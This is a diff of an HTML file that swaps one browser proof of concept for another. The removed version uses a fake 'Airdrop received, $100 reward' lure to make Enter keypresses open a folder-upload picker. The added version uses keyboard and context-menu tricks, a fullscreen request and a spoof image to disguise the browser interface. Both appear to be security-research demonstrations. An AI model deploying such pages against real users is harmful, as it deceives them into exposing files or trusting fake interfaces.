@@ -1,66 +1,58 @@
 <!DOCTYPE html>
-<html lang="en">
-
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Directory File Upload</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            overflow: hidden;
-        }
-
-        #fileList {
-            margin: 20px;
-        }
-
-        input {
-            display: none;
-        }
-    </style>
+	<title>PoC</title>
+	<style>
+		body {
+			margin: 0;
+		}
+		#spoof {
+			width:  100%;
+			height: 100%;
+		}
+		#input1 {
+			position: absolute;
+			left: 40%;
+			width: 400px;
+		}
+		#input2 {
+			position: absolute;
+			left: 40%;
+			width: 400px;
+		}
+	</style>
 </head>
-
 <body>
-    <center>
-        <h1>💸 Airdrop received! Press enter as fast as you can to earn reward! 💸</h1>
-    </center>
-    <input type="file" id="fileInput" webkitdirectory>
-    <div id="fileList"></div>
+	<img id="spoof" src="https://lbherrera.github.io/lab/emoji-spoof/spoof.png" style="display: none;"></img>
+	<div id="content">
+		<center>
+			<br>
+			<h1>Right-click on the input field and select an emoji :)</h1>
+			<input type="text" id="input1">
+			<input type="text" id="input2">
+		</center>
+	</div>
+	<script>
+		let fullscreen = false;
 
-    <script>
+		oncontextmenu = () => {
+			setTimeout(() => {
+				input2.style.top = "-25px";
+			}, 0);
+		}
 
-
-        document.addEventListener('keydown', function (event) {
-            if (event.key === 'Enter') {
-                event.preventDefault(); // Prevent the default Enter key behavior
-                document.getElementById('fileInput').showPicker();
-                setTimeout(() => {
-                    alert("🎉 Congratulations! You've just won a $100 reward! Press Enter to claim your prize!");
-            }, 500);
-               
-
-            }
-        });
-        document.getElementById('fileInput').addEventListener('change', function (event) {
-            const fileList = document.getElementById('fileList');
-            fileList.innerHTML = ''; // Clear previous file list
-
-            const files = event.target.files;
-            if (files.length === 0) {
-                fileList.innerHTML = 'No files selected.';
-                return;
-            }
-
-            const ul = document.createElement('ul');
-            for (const file of files) {
-                const li = document.createElement('li');
-                li.textContent = file.webkitRelativePath; // Display relative path
-                ul.appendChild(li);
-            }
-            fileList.appendChild(ul);
-        });
-    </script>
+		onkeydown = (event) => {
+			let key = event.which || event.keyCode;
+			if (key === 91 && !fullscreen) {
+				setTimeout(() => {
+					input2.style.width = "1px";
+					document.getElementById("spoof").style.display = "block";
+					document.getElementById("content").style.display = "none";
+					document.documentElement.requestFullscreen();
+				}, 0);
+				fullscreen = true;
+			}
+		}
+	</script>
 </body>
-
 </html>
